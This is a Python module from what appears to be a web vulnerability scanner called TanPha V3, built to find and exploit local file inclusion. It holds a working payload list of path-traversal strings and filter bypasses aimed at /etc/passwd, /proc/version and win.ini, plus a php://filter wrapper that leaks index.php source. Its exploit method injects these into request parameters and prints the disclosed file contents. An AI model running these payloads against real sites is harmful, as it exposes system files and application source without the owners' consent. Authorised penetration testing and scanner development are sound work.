"""Local File Inclusion (LFI) Module for TanPha V3 (Global Multi-OS)."""
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re


class LFIModule(BaseModule):
    name = "LFI"
    module_id = "lfi"
    version = "1.3 (Global God Tier)"
    vulnerability_class = "LOCAL_FILE_INCLUSION"
    default_impact = "SENSITIVE_FILE_DISCLOSURE"
    default_privilege = "WEB_USER"

    _TARGET_FILES = [
        {
            # GOD TIER: Read index.php source code in Base64
            "path": "php://filter/convert.base64-encode/resource=index.php",
            "signatures": ["PD9waHA", "c2Vzc2lvbl9zdGFydA==", "PGh0bWw+"], # Base64 of <?php, session_start, <html>
            "desc": "PHP Filter Base64 (Index.php)"
        },
        {
            # Linux /proc/version (always exists and readable)
            "path": "../../../../../../../../proc/version",
            "signatures": ["Linux version", "Android"],
            "desc": "Linux /proc/version (Deep Path)"
        },
        {
            "path": "../../../../../../../../etc/passwd",
            "signatures": ["root:x:0:0", "daemon:x:", "u0_a", ":/bin/bash", ":/sbin/nologin"],
            "desc": "Linux/Android /etc/passwd (Deep Path)"
        },
        {
            "path": "....//....//....//....//....//....//....//....//etc/passwd",
            "signatures": ["root:x:0:0", "daemon:x:", "u0_a", ":/bin/bash", ":/sbin/nologin"],
            "desc": "Linux/Android /etc/passwd (Medium Bypass)"
        },
        {
            "path": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "signatures": ["[extensions]", "[fonts]", "[mci extensions]"],
            "desc": "Windows win.ini (Low)"
        },
        {
            "path": "....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\....\\\\windows\\win.ini",
            "signatures": ["[extensions]", "[fonts]", "[mci extensions]"],
            "desc": "Windows win.ini (Medium Bypass)"
        }
    ]

    def can_run(self, context: TargetContext) -> bool:
        return len(context.discovery.parameters) > 0

    def _build_target_url(self, base_url: str, param: str, payload: str) -> str:
        parsed = urlparse(base_url)
        qs = parse_qsl(parsed.query, keep_blank_values=True)
        # FIX: Replace the parameter value (do not append)
        new_qs = [(k, payload) if k == param else (k, v) for k, v in qs]
        return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

    def _send_payload(self, context, param, payload, scope_checker=None, timeout=10):
        if "?" in context.target.base_url:
            target_url = self._build_target_url(context.target.base_url, param, payload)
            return context.http_client.request("GET", target_url, target_param=param, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)
        else:
            submit_field = "Submit"
            data = {param: payload, submit_field: submit_field}
            return context.http_client.request("POST", context.target.base_url, data=data, scope_checker=scope_checker, bypass_mutation=True, timeout=timeout)

    def assess(self, context: TargetContext, scope_checker=None) -> list[Evidence]:
        evidence_pool = []
        
        for param in context.discovery.parameters:
            print(f"      [>] Testing LFI on parameter: '{param}'")
            
            for target in self._TARGET_FILES:
                print(f"          [*] Trying: {target['desc']}...")
                result = self._send_payload(context, param, target["path"], scope_checker)
                
                if result.success and result.response:
                    if any(sig in result.response.text for sig in target["signatures"]):
                        print(f"      [!] LFI FOUND! Target: {target['desc']}")
                        ev = Evidence(
                            attempt_id="lfi_001",
                            module_id=self.module_id,
                            module_version=self.version,
                            location=context.target.base_url,
                            parameter=param,
                            outcome="CHANGED_RESPONSE",
                            reason_code="FILE_DISCLOSED",
                            reason_detail=f"File {target['desc']} successfully read",
                            confidence=0.95,
                            evidence_text=f"Signature found in response",
                            assess_payload=target["path"]
                        )
                        evidence_pool.append(ev)
                        break 
                        
        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, scope_checker=None) -> VerificationResult:
        print(f"      [*] Verifying LFI on '{evidence.parameter}'...")
        
        result = self._send_payload(context, evidence.parameter, evidence.assess_payload, scope_checker)
        
        if result.success and result.response:
            for target in self._TARGET_FILES:
                if target["path"] == evidence.assess_payload:
                    if any(sig in result.response.text for sig in target["signatures"]):
                        return VerificationResult(
                            VerificationStatus.VALIDATED, 0.95, 
                            "LFI_CONFIRMED", f"File {target['desc']} confirmed",
                            verify_payload=evidence.assess_payload
                        )
                        
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "LFI_FAILED", "Signature not found on re-check")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] LFI EXPLOIT: FILE DISCLOSURE [***]")
        print(f"[*] Target: {finding.location} | Parameter: {finding.parameter}")
        print(f"[*] File: {finding.verify_payload}")
        
        result = self._send_payload(context, finding.parameter, finding.verify_payload, None)
        
        if result.success and result.response:
            print("\n--- File Content (First 500 bytes) ---")
            clean_text = re.sub(r'<[^>]+>', ' ', result.response.text)
            print(clean_text[:500] + "...")
            print("--------------------------------------\n")
        else:
            print("[-] Failed to read file.")
